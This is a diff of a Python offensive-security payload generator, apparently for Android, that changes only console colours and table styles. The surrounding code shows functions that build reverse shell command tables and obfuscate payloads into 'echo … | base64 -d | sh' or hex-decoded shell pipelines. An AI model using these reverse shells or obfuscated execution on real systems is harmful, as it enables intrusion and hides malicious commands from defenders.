@@ -86,7 +86,7 @@ def generate_intent_payload(action: str, component: str = None, data: str = None
             cmd += ["-f", f]
 
     payload = " ".join(cmd)
-    console.print(Panel(payload, title="[bold cyan]Intent Payload[/]", border_style="cyan"))
+    console.print(Panel(payload, title="[bold #00ff66]⚡ Intent Payload[/]", border_style="#00ff66", box=box.ROUNDED))
     return payload
 
 
@@ -102,8 +102,8 @@ def generate_reverse_shell_commands(lhost: str, lport: int) -> list:
     ]
 
     table = Table(title=f"[bold red]💥 Reverse Shell Payloads → {lhost}:{lport}[/]",
-                  box=box.SIMPLE_HEAVY, border_style="red", header_style="bold red")
-    table.add_column("Method", style="cyan", width=16)
+                  box=box.ROUNDED, border_style="red", header_style="bold red")
+    table.add_column("Method", style="bold #00ffcc", width=16)
     table.add_column("Command", style="white")
     for method, cmd in shells:
         table.add_row(method, cmd)
@@ -164,8 +164,8 @@ def obfuscate_payload(payload: str, method: str = "base64") -> str:
         encoded = base64.b64encode(payload.encode()).decode()
         obfuscated = f"echo {encoded} | base64 -d | sh"
         console.print(Panel(
-            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (base64):[/] {obfuscated}",
-            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
+            f"[bold #00ffcc]Original:[/] {payload}\n\n[bold #00ff66]Obfuscated (base64):[/] {obfuscated}",
+            title="[bold #00ff66]⚡ Payload Obfuscation[/]", border_style="#00ff66", box=box.ROUNDED))
         return obfuscated
 
     elif method == "hex":
@@ -174,8 +174,8 @@ def obfuscate_payload(payload: str, method: str = "base64") -> str:
         hex_str = "\\x" + "\\x".join(pairs)
         obfuscated = f"echo -e '{hex_str}' | sh"
         console.print(Panel(
-            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (hex):[/] {obfuscated}",
-            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
+            f"[bold #00ffcc]Original:[/] {payload}\n\n[bold #00ff66]Obfuscated (hex):[/] {obfuscated}",
+            title="[bold #00ff66]⚡ Payload Obfuscation[/]", border_style="#00ff66", box=box.ROUNDED))
         return obfuscated
 
     return payload
@@ -191,9 +191,9 @@ def payload_menu():
         ("5", "Obfuscate Payload (base64/hex)"),
         ("0", "Back"),
     ]
-    t = Table(title="[bold red]🎯 Payload Generator[/]", box=box.DOUBLE_EDGE,
+    t = Table(title="[bold red]🎯 Payload Generator[/]", box=box.ROUNDED,
               border_style="red", header_style="bold red")
-    t.add_column("Option", style="cyan", width=6)
+    t.add_column("Option", style="bold #00ffcc", width=8)
     t.add_column("Module", style="white")
     for num, desc in options:
         t.add_row(f"[{num}]", desc)
